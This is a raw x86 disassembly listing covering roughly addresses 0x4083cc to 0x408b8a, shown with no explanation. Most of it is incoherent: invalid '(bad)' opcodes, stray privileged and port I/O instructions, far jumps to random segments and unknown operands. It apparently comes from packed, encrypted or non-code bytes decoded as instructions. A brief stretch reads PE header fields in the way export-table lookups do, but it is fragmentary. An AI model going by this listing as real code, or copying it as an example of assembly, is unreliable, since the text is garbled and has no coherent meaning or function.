  4083cc:	test   BYTE PTR [eax],cl
  4083ce:	mov    dh,0x3c
  4083d0:	loop   0x40843c
  4083d2:	xchg   DWORD PTR [ebp-0x30],esi
  4083d5:	pop    ebx
  4083d6:	add    al,0xe7
  4083d8:	(bad)  
  4083d9:	xchg   edx,eax
  4083da:	xchg   edi,eax
  4083db:	mov    al,0x59
  4083dd:	into   
  4083de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083df:	loop   0x4083bf
  4083e1:	mov    eax,ds:0xc813dba6
  4083e6:	xchg   edx,eax
  4083e7:	inc    esi
  4083e8:	je     0x40836f
  4083ea:	jae    0x408378
  4083ec:	adc    eax,ebp
  4083ee:	mov    bl,0xb8
  4083f0:	xchg   edi,eax
  4083f1:	into   
  4083f2:	inc    ecx
  4083f3:	jmp    0xe0f5:0x16eeb4e6
  4083fa:	and    al,0xf8
  4083fc:	mov    eax,ds:0xc0832469
  408401:	call   FWORD PTR [ebp+0x10]
  408404:	cmp    BYTE PTR [esi+0x41bb12b2],dl
  40840a:	adc    BYTE PTR [eax+eiz*2-0x3290896f],0x26
  408412:	inc    ebx
  408413:	xchg   ebx,eax
  408414:	fbstp  TBYTE PTR [esi+0x6457fc11]
  40841a:	inc    esp
  40841b:	ins    BYTE PTR es:[edi],dx
  40841c:	xor    dh,ah
  40841e:	gs ds mov al,0x1
  408422:	and    bl,dh
  408424:	loop   0x40844e
  408426:	call   DWORD PTR [eax+esi*8]
  408429:	inc    ebx
  40842a:	mov    ah,0xbb
  40842c:	push   ebx
  40842d:	aad    0xfa
  40842f:	pop    esp
  408430:	rol    DWORD PTR [edi],0x19
  408433:	mov    ds:0x71f6893a,eax
  408438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408439:	dec    cl
  40843b:	call   0x1f98:0x516c0f8d
  408442:	xchg   ebx,eax
  408443:	fnstcw WORD PTR [ecx-0x20]
  408446:	pop    es
  408447:	jmp    0x408433
  408449:	hlt    
  40844a:	popf   
  40844b:	mov    bl,BYTE PTR [ebp+0x3b]
  40844e:	add    BYTE PTR [ecx],ch
  408450:	sbb    DWORD PTR [eax-0x7fe115ce],0xffffff89
  408457:	je     0x4084ab
  408459:	mov    esp,0x4a29e2dc
  40845e:	xchg   esi,eax
  40845f:	inc    ebp
  408460:	sbb    al,0xa6
  408462:	inc    esi
  408463:	gs or  al,0xb4
  408466:	xor    edx,DWORD PTR [ebx+eax*2+0x4277f905]
  40846d:	mov    bl,BYTE PTR [esi]
  40846f:	or     edx,DWORD PTR [ebx]
  408471:	sahf   
  408472:	imul   esp,eax,0x38
  408475:	fst    st(2)
  408477:	aaa    
  408478:	hlt    
  408479:	std    
  40847a:	adc    BYTE PTR [edi+0x56],cl
  40847d:	adc    bh,bl
  40847f:	pop    esi
  408480:	jns    0x4084e9
  408482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408483:	mov    dh,BYTE PTR [esi-0x58]
  408486:	pop    es
  408487:	mov    cl,0x44
  408489:	add    al,0x61
  40848b:	das    
  40848c:	in     eax,0xb7
  40848e:	dec    edx
  40848f:	div    DWORD PTR [ebx]
  408491:	adc    ebx,DWORD PTR [edx+0x2be59c30]
  408497:	test   cl,cl
  408499:	sbb    ebp,DWORD PTR [edx+0x4]
  40849c:	test   al,ch
  40849e:	mov    BYTE PTR [edi-0x1c664d29],0x89
  4084a5:	sub    ebp,esp
  4084a7:	je     0x4084f7
  4084a9:	fdiv   st(1),st
  4084ab:	jp     0x408457
  4084ad:	cmp    edx,esp
  4084af:	xchg   ebx,eax
  4084b0:	rcr    BYTE PTR [eax-0x7561a98a],cl
  4084b6:	fcmovne st,st(7)
  4084b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084b9:	cli    
  4084ba:	sbb    BYTE PTR [ebp-0x7bcf467e],0x44
  4084c1:	adc    eax,0x79d5bb62
  4084c6:	or     al,0xe3
  4084c8:	shr    DWORD PTR [edx],cl
  4084ca:	mov    ds:0x55b2c467,al
  4084cf:	push   esp
  4084d0:	or     ah,BYTE PTR [esi]
  4084d2:	xchg   DWORD PTR [ebx-0x23],eax
  4084d5:	xchg   ecx,eax
  4084d6:	push   ss
  4084d7:	fst    DWORD PTR [edx]
  4084d9:	push   cs
  4084da:	sub    esi,ecx
  4084dc:	nop
  4084dd:	aam    0x4c
  4084df:	xor    DWORD PTR [esp+edx*2-0x80],ecx
  4084e3:	in     al,0x8f
  4084e5:	push   ecx
  4084e6:	mov    edx,0x4ba3ab1b
  4084eb:	xchg   ebp,eax
  4084ec:	and    eax,DWORD PTR [edi-0x60]
  4084ef:	and    eax,0x6697ab50
  4084f4:	je     0x4084d0
  4084f6:	(bad)  
  4084f8:	inc    esi
  4084f9:	repnz test BYTE PTR [esi-0x39],0x4d
  4084fe:	dec    esi
  4084ff:	outs   dx,BYTE PTR ds:[esi]
  408500:	(bad)  
  408501:	(bad)  
  408502:	sbb    al,0x14
  408504:	sahf   
  408505:	jo     0x4084bd
  408507:	xchg   edx,eax
  408508:	loope  0x40854d
  40850a:	test   dl,al
  40850c:	call   0x8b9dc089
  408511:	(bad)
  408514:	jbe    0x408519
  408516:	push   ecx
  408517:	push   0x887705a1
  40851c:	lock ror DWORD PTR [ebx-0x2a76bc47],cl
  408523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408524:	leave  
  408525:	jge    0x40858e
  408527:	leave  
  408528:	pop    eax
  408529:	rcl    DWORD PTR [ecx+0x13],0x88
  40852d:	sub    DWORD PTR [ebp-0x14],eax
  408530:	retfw  0x8b1b
  408534:	cdq    
  408535:	adc    esi,DWORD PTR [eax-0xae09e95]
  40853b:	xchg   ecx,eax
  40853c:	arpl   WORD PTR [ecx+0x33],cx
  40853f:	pushf  
  408540:	sub    al,0x54
  408542:	sbb    dl,BYTE PTR [esi]
  408544:	inc    edx
  408545:	jae    0x4084de
  408547:	inc    esi
  408548:	dec    eax
  408549:	jb     0x40854d
  40854b:	pop    ebx
  40854c:	into   
  40854d:	sbb    edx,DWORD PTR [ebx]
  40854f:	std    
  408550:	push   esi
  408551:	mov    esp,0x7d4fc2c6
  408556:	or     BYTE PTR [bx+si],bh
  408559:	jmp    0x40851c
  40855b:	dec    ebx
  40855c:	and    eax,0x768180f2
  408561:	cmp    BYTE PTR [eax+0x35094fa],cl
  408567:	push   esp
  408568:	xor    al,BYTE PTR [ecx+0x73]
  40856b:	pop    ebx
  40856c:	sbb    al,0xb5
  40856e:	mov    eax,0x598ee3eb
  408573:	daa    
  408574:	aas    
  408575:	(bad)  
  408576:	sbb    ecx,DWORD PTR [ebx+0x5f]
  408579:	hlt    
  40857a:	mov    bh,0x9
  40857c:	jns    0x4085f0
  40857e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40857f:	sub    DWORD PTR [edx-0x7c],ebx
  408582:	inc    ebp
  408583:	jo     0x408540
  408585:	jp     0x408554
  408587:	enter  0xdaee,0x9c
  40858b:	js     0x408542
  40858d:	popa   
  40858e:	lea    ebx,[esi+eiz*2]
  408591:	cwde   
  408592:	lahf   
  408593:	mov    ah,0xb4
  408595:	in     al,0x49
  408597:	fnstcw WORD PTR [edx+0x6a]
  40859a:	and    eax,0xa9501d8d
  40859f:	sub    eax,0x8934da52
  4085a4:	inc    eax
  4085a5:	push   edx
  4085a6:	sub    eax,0x2d91e309
  4085ab:	mov    ds:0xc500a0a1,eax
  4085b0:	out    0x6a,eax
  4085b2:	pop    ebp
  4085b3:	sahf   
  4085b4:	loopne 0x40860c
  4085b6:	mov    esi,0xe76f2111
  4085bb:	sahf   
  4085bc:	popf   
  4085bd:	fwait
  4085be:	inc    esi
  4085bf:	mov    ebp,0x4b95b799
  4085c4:	mov    BYTE PTR [ebp-0x72],0xdb
  4085c8:	push   ss
  4085c9:	mov    bh,0xdb
  4085cb:	aam    0x43
  4085cd:	push   es
  4085ce:	sub    eax,0x9546e747
  4085d3:	sbb    al,BYTE PTR [ebx]
  4085d5:	jnp    0x4085f4
  4085d7:	dec    ebx
  4085d8:	stos   BYTE PTR es:[edi],al
  4085d9:	outs   dx,BYTE PTR ds:[esi]
  4085da:	dec    ecx
  4085db:	mov    WORD PTR [edi+0x28],?
  4085de:	jle    0x40865e
  4085e0:	lods   eax,DWORD PTR ds:[esi]
  4085e1:	popaw  
  4085e3:	adc    al,0x9
  4085e5:	daa    
  4085e6:	ins    BYTE PTR es:[edi],dx
  4085e7:	outs   dx,DWORD PTR ds:[esi]
  4085e8:	out    dx,al
  4085e9:	push   ebx
  4085ea:	test   BYTE PTR [esi+0x5f],0xd6
  4085ee:	out    0x9f,eax
  4085f0:	dec    eax
  4085f1:	pop    es
  4085f2:	push   cs
  4085f3:	mov    ch,0x6
  4085f5:	add    DWORD PTR [edx],ebp
  4085f7:	call   DWORD PTR [ebp+0x18]
  4085fa:	xchg   BYTE PTR [eax],bl
  4085fc:	and    DWORD PTR ds:[edi-0xe],eax
  408600:	mov    ebx,0x90a234ac
  408605:	jmp    0x6e3a:0x9c3f2158
  40860c:	stos   DWORD PTR es:[edi],eax
  40860d:	fisubr DWORD PTR [esp+edi*1-0x179f8443]
  408614:	ss inc ebx
  408616:	cmc    
  408617:	imul   ecx,eax,0x19dbe196
  40861d:	dec    esi
  40861e:	je     0x408600
  408620:	push   ecx
  408621:	test   BYTE PTR [ecx+esi*1-0x69eec170],cl
  408628:	dec    esp
  408629:	mov    cl,0x91
  40862b:	out    dx,eax
  40862c:	retf   
  40862d:	out    0x1c,al
  40862f:	mov    ds:0x603834db,eax
  408634:	dec    edx
  408635:	mov    esi,0x155cb8a4
  40863a:	push   edx
  40863b:	cmp    DWORD PTR [ebp+0x64],esi
  40863e:	call   0x33a6:0x3774146c
  408645:	les    ebx,FWORD PTR [eax-0x46]
  408648:	xchg   ebp,edx
  40864a:	xor    BYTE PTR [eax+0x784edb4b],ch
  408650:	push   DWORD PTR [edi+0x4b]
  408653:	jmp    0xcc595d6
  408658:	add    BYTE PTR [eax],al
  40865a:	add    BYTE PTR [ebx+0x45399c45],cl
  408660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408661:	je     0x408e5e
  408667:	mov    eax,DWORD PTR [ebp+0x8]
  40866a:	mov    edx,DWORD PTR [ebp+0xc]
  40866d:	mov    edx,DWORD PTR [ebp-0x4]
  408670:	mov    edx,DWORD PTR [edx+0x3c]
  408673:	lea    eax,[edx+eax*8+0x78]
  408677:	mov    edx,DWORD PTR [ebp-0x4]
  40867a:	mov    eax,DWORD PTR [edx+eax*1]
  40867d:	mov    DWORD PTR [ebp-0x24],eax
  408680:	jmp    0x408a5e
  408685:	or     ah,BYTE PTR [ebx+0x79]
  408688:	jns    0x4086eb
  40868a:	arpl   WORD PTR [edx],cx
  40868c:	pop    ebx
  40868d:	fadd   QWORD PTR [ebx+0x2f]
  408690:	mov    esi,0xaa18f2b4
  408695:	das    
  408696:	pop    edi
  408697:	sbb    BYTE PTR [eax],bl
  408699:	sahf   
  40869a:	adc    bl,BYTE PTR [eax]
  40869c:	sbb    BYTE PTR [ecx+0x78],dl
  40869f:	or     al,0x29
  4086a1:	into   
  4086a2:	adc    eax,0x619897cc
  4086a7:	pop    esp
  4086a8:	xchg   ecx,eax
  4086a9:	popa   
  4086aa:	fdivp  st(7),st
  4086ac:	aas    
  4086ad:	mul    BYTE PTR [edi-0x57cb94f8]
  4086b3:	adc    edx,DWORD PTR [edi-0x7a]
  4086b6:	cmp    DWORD PTR [esi],esi
  4086b8:	daa    
  4086b9:	(bad)  
  4086bb:	mov    cs,WORD PTR [ebx+0x5ae268da]
  4086c1:	dec    ecx
  4086c2:	iret   
  4086c3:	out    dx,eax
  4086c4:	cli    
  4086c5:	iret   
  4086c6:	frstpm(287 only) 
  4086c8:	push   ds
  4086c9:	test   BYTE PTR [edi],0x44
  4086cc:	jmp    0x69a14b78
  4086d1:	(bad)  
  4086d2:	mov    edx,0x74ec20c
  4086d7:	pop    ss
  4086d8:	popa   
  4086d9:	mov    eax,ds:0xbe155324
  4086de:	cmp    DWORD PTR [ecx],ebx
  4086e0:	arpl   di,sp
  4086e2:	inc    ecx
  4086e3:	in     eax,dx
  4086e4:	retf   0xe542
  4086e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086e8:	adc    eax,0x18d9d065
  4086ed:	xchg   BYTE PTR [esi],ah
  4086ef:	and    BYTE PTR [ebp+0x65],0xba
  4086f3:	repz dec esi
  4086f5:	mov    eax,0xf5b41e2b
  4086fa:	mov    ebx,0x8d84c93b
  4086ff:	jae    0x408698
  408701:	dec    eax
  408702:	cmp    eax,DWORD PTR [esi]
  408704:	pop    edi
  408705:	in     al,0xff
  408707:	cmp    ah,BYTE PTR [ebx]
  408709:	xchg   edi,eax
  40870a:	xchg   edx,eax
  40870b:	push   ecx
  40870c:	push   ecx
  40870d:	retf   0x39fa
  408710:	and    esp,DWORD PTR [ecx-0x7fb4fd16]
  408716:	xchg   ebx,eax
  408717:	jnp    0x408740
  408719:	enter  0x4d94,0xaf
  40871d:	ins    DWORD PTR es:[edi],dx
  40871e:	call   0xc1cf2930
  408723:	and    ebx,esp
  408725:	jge    0x40871c
  408727:	xchg   DWORD PTR [edi-0x5a],esp
  40872a:	in     al,dx
  40872b:	fnstcw WORD PTR [ebp-0x7e]
  40872e:	js     0x408737
  408730:	inc    esp
  408731:	dec    edi
  408732:	hlt    
  408733:	xor    eax,esp
  408735:	mov    ebx,DWORD PTR [edx+0x5f90e015]
  40873b:	or     ebx,DWORD PTR [ebx+0x62a2e39d]
  408741:	popa   
  408742:	mov    WORD PTR [edi+0x3a78bb48],ss
  408748:	jmp    0x4087c7
  40874a:	or     BYTE PTR [edx+esi*8+0x77],dh
  40874e:	rol    bl,1
  408750:	pop    ebp
  408751:	cmp    ebp,DWORD PTR [edi+edi*4-0x36ded00b]
  408758:	xchg   BYTE PTR [ecx-0x1b],ah
  40875b:	sbb    ch,ch
  40875d:	push   ds
  40875e:	leave  
  40875f:	sbb    al,0x42
  408761:	(bad)  
  408763:	xor    DWORD PTR [ebx-0x1898bab2],0x528a7a7
  40876d:	xor    BYTE PTR [edx-0x58],ah
  408770:	paddw  mm4,QWORD PTR [edi]
  408773:	call   0xf8d12e4d
  408778:	inc    eax
  408779:	adc    eax,0x8c0e52cb
  40877e:	lahf   
  40877f:	lahf   
  408780:	mov    esp,0xbfd144b9
  408785:	or     ah,dl
  408787:	xor    ah,BYTE PTR [edi]
  408789:	xchg   edi,eax
  40878a:	in     al,0xd0
  40878c:	xchg   DWORD PTR [eax+0x39],edi
  40878f:	and    esp,DWORD PTR [ebx+0x29d7cf0]
  408795:	jbe    0x4087f7
  408797:	or     al,BYTE PTR [eax]
  408799:	les    edx,FWORD PTR [ecx]
  40879b:	jb     0x40879f
  40879d:	dec    edi
  40879e:	jp     0x408761
  4087a0:	pop    esp
  4087a1:	es popf 
  4087a3:	scas   eax,DWORD PTR es:[edi]
  4087a4:	hlt    
  4087a5:	pop    ss
  4087a6:	jo     0x408794
  4087a8:	fisubr WORD PTR [edi]
  4087aa:	push   cs
  4087ab:	pushf  
  4087ac:	pop    edx
  4087ad:	mov    eax,ds:0x35f7b43e
  4087b2:	xchg   ecx,eax
  4087b3:	pop    esp
  4087b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087b5:	repnz mov WORD PTR [ecx],fs
  4087b8:	jmp    0xd095372c
  4087bd:	push   eax
  4087be:	ins    BYTE PTR es:[edi],dx
  4087bf:	jmp    0xfbf82002
  4087c4:	add    al,0xec
  4087c6:	ja     0x4087e0
  4087c8:	loopne 0x4087eb
  4087ca:	jge    0x408791
  4087cc:	mov    dl,0xbe
  4087ce:	popa   
  4087cf:	jp     0x4087b8
  4087d1:	mov    ebx,0x9a72e44a
  4087d6:	push   ds
  4087d7:	push   edx
  4087d8:	retf   
  4087d9:	push   ds
  4087da:	dec    esp
  4087db:	(bad)  
  4087dc:	xchg   edx,eax
  4087dd:	mov    esp,0xa9ded8b3
  4087e2:	int    0xae
  4087e4:	push   edi
  4087e5:	fwait
  4087e6:	das    
  4087e7:	retf   
  4087e8:	mov    al,cl
  4087ea:	jg     0x408840
  4087ec:	pop    ebx
  4087ed:	push   ecx
  4087ee:	or     eax,DWORD PTR [edx]
  4087f0:	fisub  WORD PTR [eiz*2+0xb819a2b]
  4087f7:	sub    BYTE PTR [edx],ch
  4087f9:	sub    al,0x63
  4087fb:	cmp    ah,BYTE PTR [ebx+0x4c]
  4087fe:	xor    BYTE PTR [eax],0x26
  408801:	adc    cl,BYTE PTR [eax]
  408803:	fdivr  DWORD PTR [ebp-0xc]
  408806:	sbb    dh,BYTE PTR [edx+edx*1]
  408809:	sub    al,0x43
  40880b:	add    al,BYTE PTR [edi-0x227beecc]
  408811:	push   0x63
  408813:	push   ebp
  408814:	sub    DWORD PTR [ecx+0x0],edx
  408817:	shl    edi,1
  408819:	in     al,0x14
  40881b:	call   0x6c44:0xcf241565
  408822:	ds mov ebx,0x326164e
  408828:	push   cs
  408829:	jbe    0x408858
  40882b:	fild   DWORD PTR [edi+eax*2+0x285b94ab]
  408832:	sahf   
  408833:	ins    BYTE PTR es:[edi],dx
  408834:	movups xmm1,xmm6
  408837:	mov    esp,DWORD PTR [eax-0x38c86d3f]
  40883d:	std    
  40883e:	jmp    0x8556:0xbbbd26ce
  408845:	sbb    eax,0xb3bbcde3
  40884a:	out    0x38,al
  40884c:	popf   
  40884d:	push   edi
  40884e:	outs   dx,DWORD PTR ds:[esi]
  40884f:	or     BYTE PTR [eax-0x33919eea],ch
  408855:	adc    esi,DWORD PTR [ecx]
  408857:	std    
  408858:	add    BYTE PTR [eax],dh
  40885a:	fist   DWORD PTR [edx]
  40885c:	imul   esp,DWORD PTR [ebx+ecx*4-0x7a2defd1],0xffffff9b
  408864:	mov    al,0x43
  408866:	aaa    
  408867:	xor    ah,al
  408869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40886a:	push   0xffffff8e
  40886c:	dec    ebp
  40886d:	(bad)  
  40886e:	push   es
  40886f:	jmp    0x408820
  408871:	test   eax,0x7b058ed1
  408876:	into   
  408877:	pop    ebx
  408878:	jb     0x4088ef
  40887a:	sbb    dl,BYTE PTR [edi]
  40887c:	fdiv   QWORD PTR es:[ecx+0x2e]
  408880:	pop    esi
  408881:	fistp  DWORD PTR [esi-0x16f5cb7]
  408887:	pop    ss
  408888:	dec    ecx
  408889:	dec    ebp
  40888a:	push   edx
  40888b:	mov    eax,ds:0x28b3e244
  408890:	mov    ch,0x6b
  408892:	neg    DWORD PTR [eax+0x35]
  408895:	(bad)  
  408896:	repnz and al,0x47
  408899:	hlt    
  40889a:	add    BYTE PTR ss:[esi-0x67],dh
  40889e:	dec    ebx
  40889f:	jo     0x408845
  4088a1:	add    DWORD PTR [edx],eax
  4088a3:	shr    bl,0xb8
  4088a6:	mov    eax,0x1c84e059
  4088ab:	mov    ds:0xdb23e7e7,al
  4088b0:	or     bh,BYTE PTR [ebp+0x1c11cdef]
  4088b6:	(bad)  
  4088b7:	fs cmp al,0xce
  4088ba:	aad    0x1b
  4088bc:	popa   
  4088bd:	adc    BYTE PTR [edx-0x5c808ad5],dl
  4088c3:	js     0x408893
  4088c5:	and    eax,0xed8ae976
  4088ca:	pop    ecx
  4088cb:	pop    ebp
  4088cc:	jo     0x408927
  4088ce:	sub    DWORD PTR [edi],ebx
  4088d0:	aaa    
  4088d1:	jo     0x408931
  4088d3:	shl    DWORD PTR [ebx],1
  4088d5:	cwde   
  4088d6:	pop    ebp
  4088d7:	xchg   DWORD PTR [ecx],edx
  4088d9:	(bad)  
  4088da:	ins    BYTE PTR es:[edi],dx
  4088db:	xchg   esi,eax
  4088dc:	dec    ecx
  4088dd:	das    
  4088de:	(bad)  
  4088e0:	loopne 0x408885
  4088e2:	mov    eax,ds:0x27b25a33
  4088e7:	ins    DWORD PTR es:[edi],dx
  4088e8:	push   esp
  4088e9:	push   ebp
  4088ea:	fwait
  4088eb:	xchg   esi,eax
  4088ec:	hlt    
  4088ed:	out    0xaa,eax
  4088ef:	adc    ah,bl
  4088f1:	rol    BYTE PTR [edi-0x70e204a7],cl
  4088f7:	pop    ebx
  4088f8:	push   eax
  4088f9:	in     al,dx
  4088fa:	mov    ecx,0xe92b24b9
  4088ff:	in     eax,0x94
  408901:	inc    ebx
  408902:	shr    cl,cl
  408904:	mov    edx,0x7a15adb5
  408909:	sub    BYTE PTR [ebp+0x7c],dh
  40890c:	(bad)  
  40890e:	cmp    BYTE PTR [edx-0x472ab760],0xe4
  408915:	imul   DWORD PTR [edx]
  408917:	fld    TBYTE PTR cs:[esi+0x25]
  40891b:	adc    eax,0x9b04ef28
  408920:	stos   DWORD PTR es:[edi],eax
  408921:	fwait
  408922:	xlat   BYTE PTR ds:[ebx]
  408923:	pop    edx
  408924:	or     ch,BYTE PTR [ecx+edi*4-0x41a4922c]
  40892b:	test   eax,0xa707596c
  408930:	fwait
  408931:	lea    edx,[eax]
  408933:	mov    al,ds:0xa67295f
  408938:	mov    BYTE PTR [edi],ah
  40893a:	sub    dl,al
  40893c:	inc    edi
  40893d:	into   
  40893e:	push   esp
  40893f:	mov    eax,0xe119779d
  408944:	hlt    
  408945:	adc    dh,BYTE PTR [ebx]
  408947:	pushf  
  408948:	mov    bl,0x2d
  40894a:	jmp    0x408962
  40894c:	pop    ds
  40894d:	sar    ebx,cl
  40894f:	repnz es adc dh,bl
  408953:	fdivr  QWORD PTR [eax+0x27acccf8]
  408959:	in     al,dx
  40895a:	xor    DWORD PTR [eax],0xa
  40895d:	mov    esp,0x712a88db
  408962:	(bad)  
  408963:	push   ebx
  408964:	adc    ebx,DWORD PTR [edi-0x69c7f1dc]
  40896a:	push   ecx
  40896b:	or     eax,0xf38b1832
  408970:	mov    esp,0xb073aaca
  408975:	pop    es
  408976:	das    
  408977:	mov    ah,0x9
  408979:	scas   al,BYTE PTR es:[edi]
  40897a:	mov    cl,0x87
  40897c:	je     0x4089c5
  40897e:	loop   0x408938
  408980:	pop    ecx
  408981:	push   ebp
  408982:	push   eax
  408983:	sub    bh,BYTE PTR [edx-0x137fc12e]
  408989:	int    0x5f
  40898b:	sahf   
  40898c:	or     eax,0xc01fae1c
  408991:	or     eax,0x6ad62875
  408996:	xchg   esi,eax
  408997:	jmp    0xb5e944bd
  40899c:	mov    cl,0x5
  40899e:	stc    
  40899f:	imul   eax,DWORD PTR [esi-0x47],0xfb378d0e
  4089a6:	xor    ebx,DWORD PTR [ebx+0x41]
  4089a9:	sub    ax,0x89dc
  4089ad:	xchg   esp,eax
  4089ae:	xchg   ebx,eax
  4089af:	sar    DWORD PTR [ebp+0x2c],cl
  4089b2:	dec    ebp
  4089b3:	cmp    dh,al
  4089b5:	xchg   ecx,eax
  4089b6:	add    ah,ch
  4089b8:	cwde   
  4089b9:	push   eax
  4089ba:	cdq    
  4089bb:	dec    esp
  4089bc:	or     eax,0x4cf54ecb
  4089c1:	stos   BYTE PTR es:[edi],al
  4089c2:	imul   edi,DWORD PTR [ebp+0x6671c8ff],0xb7493b06
  4089cc:	jns    0x408a47
  4089ce:	pop    ecx
  4089cf:	es xor eax,0x5d87a34d
  4089d5:	sti    
  4089d6:	je     0x408a35
  4089d8:	popa   
  4089d9:	(bad)  
  4089da:	in     al,0x42
  4089dc:	xor    BYTE PTR [ebx+eax*8-0x42],ch
  4089e0:	mov    edi,ebx
  4089e2:	mov    eax,ds:0x1f5f5a87
  4089e7:	int    0xdf
  4089e9:	sbb    eax,0x991e1ca4
  4089ee:	cli    
  4089ef:	dec    esi
  4089f0:	mov    al,BYTE PTR [edx-0x527c404d]
  4089f6:	mov    ch,0xe4
  4089f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089f9:	stos   BYTE PTR es:[edi],al
  4089fa:	add    eax,0x1c2d5c45
  4089ff:	mul    edi
  408a01:	add    ebx,eax
  408a03:	and    ecx,DWORD PTR ds:0x34d7f2d3
  408a09:	pop    ss
  408a0a:	ins    BYTE PTR es:[edi],dx
  408a0b:	ins    DWORD PTR es:[edi],dx
  408a0c:	shl    BYTE PTR [ebx-0x1a],cl
  408a0f:	dec    edi
  408a10:	(bad)  
  408a11:	mov    cl,0x27
  408a13:	out    dx,eax
  408a14:	test   eax,0xbdcc33ff
  408a19:	lahf   
  408a1a:	out    dx,al
  408a1b:	cmp    BYTE PTR [edi+0x7],bh
  408a1e:	outs   dx,BYTE PTR ds:[esi]
  408a1f:	(bad)  
  408a20:	loopne 0x408a4d
  408a22:	ss ss mov cl,0x47
  408a26:	push   esp
  408a27:	pop    edx
  408a28:	xlat   BYTE PTR ds:[ebx]
  408a29:	sahf   
  408a2a:	sub    al,0xc
  408a2c:	data16 ja 0x4089cb
  408a2f:	or     eax,0x9543e1b2
  408a34:	(bad)  
  408a35:	jge    0x408a71
  408a37:	jl     0x4089ca
  408a39:	out    dx,eax
  408a3a:	fisttp QWORD PTR [ebp+0x134d8605]
  408a40:	adc    eax,DWORD PTR [edx]
  408a42:	dec    ecx
  408a43:	cmp    BYTE PTR [ebp-0x54],dl
  408a46:	out    dx,eax
  408a47:	data16 cli 
  408a49:	into   
  408a4a:	cdq    
  408a4b:	iret   
  408a4c:	adc    edx,edx
  408a4e:	in     eax,0xd7
  408a50:	rcl    DWORD PTR cs:[edi+0x440f30e2],1
  408a57:	mov    ah,0xa1
  408a59:	push   cs
  408a5a:	ins    BYTE PTR es:[edi],dx
  408a5b:	mov    ebp,0x68ba3a2
  408a60:	mov    edx,DWORD PTR [esi+0x4]
  408a63:	jmp    0x408e41
  408a68:	pop    ebx
  408a69:	jno    0x408ac9
  408a6b:	mov    ds:0x301ba25a,al
  408a70:	xchg   DWORD PTR es:[ebp-0x44],esp
  408a74:	dec    ebp
  408a75:	mov    DWORD PTR [edi+0x1857b57c],esi
  408a7b:	sbb    BYTE PTR [esi-0x50e7e7ee],bl
  408a81:	call   0x98d5:0x895be092
  408a88:	push   0x42d04568
  408a8d:	jmp    DWORD PTR [edi+0x7075d5b6]
  408a93:	(bad)  
  408a94:	ret    0x533b
  408a97:	shl    al,cl
  408a99:	mov    ah,0xb8
  408a9b:	mov    ebx,?
  408a9d:	stos   BYTE PTR es:[edi],al
  408a9e:	icebp  
  408a9f:	pop    edx
  408aa0:	jle    0x408af5
  408aa2:	cmp    cl,cl
  408aa4:	fs (bad) 
  408aa6:	pop    esi
  408aa7:	sar    BYTE PTR [ecx+0x7af6f256],0x34
  408aae:	sahf   
  408aaf:	test   DWORD PTR [edi-0x74],esp
  408ab2:	jmp    0x408ac8
  408ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ab5:	(bad)  [esi+ebp*8-0xaba0f7f]
  408abc:	push   edi
  408abd:	mov    edx,0x4ee65e6d
  408ac2:	mov    ?,WORD PTR [edx+esi*8+0x71c895a1]
  408ac9:	add    ecx,DWORD PTR [ecx+0x60a1ec73]
  408acf:	dec    esi
  408ad0:	in     al,dx
  408ad1:	in     al,dx
  408ad2:	and    eax,0x251efb3
  408ad7:	push   ebp
  408ad8:	adc    bl,bh
  408ada:	mov    ah,0x3
  408adc:	jp     0x408ac2
  408ade:	lock pop ebx
  408ae0:	jnp    0x408af5
  408ae2:	xchg   ebp,eax
  408ae3:	int    0x9a
  408ae5:	fnstsw WORD PTR [edx+ebx*8+0x432bd3ff]
  408aec:	out    0x84,eax
  408aee:	bound  ebp,QWORD PTR [eax]
  408af0:	aad    0xf9
  408af2:	ja     0x408af6
  408af4:	jge    0x408b47
  408af6:	shl    BYTE PTR [ebx-0x670f530f],cl
  408afc:	mov    al,al
  408afe:	psubsb mm7,QWORD PTR [edi]
  408b01:	inc    DWORD PTR [edx]
  408b03:	mov    bh,bl
  408b05:	adc    DWORD PTR [edi-0x44195d3c],ebp
  408b0b:	imul   ecx,DWORD PTR [ebx+0x5036e3dc],0xffffffff
  408b12:	ds sbb al,0x65
  408b15:	inc    ecx
  408b16:	mov    WORD PTR [ebx+edi*8+0x77e7ee8f],cs
  408b1d:	lods   al,BYTE PTR ds:[esi]
  408b1e:	mov    ch,0x29
  408b20:	mov    esi,0xeb99e40a
  408b25:	aad    0xc4
  408b27:	pop    es
  408b28:	mov    cl,0xde
  408b2a:	je     0x408b58
  408b2c:	jg     0x408ae8
  408b2e:	xchg   esp,eax
  408b2f:	and    dh,BYTE PTR [ebx-0x461024fa]
  408b35:	mov    al,0x6
  408b37:	lahf   
  408b38:	ss cs in eax,0x4b
  408b3c:	push   ds
  408b3d:	adc    BYTE PTR [edi],0xee
  408b40:	adc    ebx,ebp
  408b42:	mov    al,0x1
  408b44:	inc    ebp
  408b45:	xchg   ebx,eax
  408b46:	test   BYTE PTR [eax+ebp*4+0x56],cl
  408b4a:	jb     0x408bbd
  408b4c:	mov    cl,0xf9
  408b4e:	jno    0x408b81
  408b50:	jno    0x408af6
  408b52:	loope  0x408ba5
  408b54:	xchg   edi,eax
  408b55:	ret    
  408b56:	xlat   BYTE PTR ds:[ebx]
  408b57:	jecxz  0x408b62
  408b59:	sar    BYTE PTR [ebx-0x4f],0x5a
  408b5d:	cmp    eax,0x26c80175
  408b62:	xchg   esp,eax
  408b63:	jne    0x408b21
  408b65:	dec    ebx
  408b66:	data16 inc BYTE PTR [eax+0x608220db]
  408b6d:	mov    ds:0x692d3a2c,eax
  408b72:	test   eax,0x3dde3fa7
  408b77:	and    al,0xa
  408b79:	mov    al,ds:0x9e348d8d
  408b7e:	retf   
  408b7f:	mov    esi,0x6106e94c
  408b84:	mov    BYTE PTR [edx+ebp*4+0x30],cl
  408b88:	sbb    al,0x3f
  408b8a:	pusha  
